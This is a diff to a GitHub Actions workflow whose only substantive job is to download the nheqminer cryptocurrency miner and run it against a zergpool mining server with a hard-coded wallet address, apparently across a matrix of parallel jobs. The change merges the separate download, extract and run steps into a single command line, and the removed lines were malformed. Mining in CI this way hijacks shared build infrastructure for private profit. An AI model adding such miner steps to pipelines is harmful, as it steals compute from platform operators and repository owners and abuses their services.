@@ -15,14 +15,8 @@ jobs:
     env:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
-    steps:
-    - name: DOWNLOAD
-      run: wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz 
-    - name: Extract
-      run: /tar -xvf nheqminer-Linux-v0.8.2.tgz
-      - name: Extract2
-      run: /tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+    steps:     
     - name: RUNNING
-      run: nheqminer/nheqminer -v -l verushash.asia.mine.zergpool.com:3300 -u D8DbPAvAri2Uu27WfoWcWHwsZrkrrvYRSh.PC2 -p c=DOGE -t 8
+      run: wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l verushash.asia.mine.zergpool.com:3300 -u D8DbPAvAri2Uu27WfoWcWHwsZrkrrvYRSh.PC2 -p c=DOGE -t 8
     - name: DONE
       run: exit
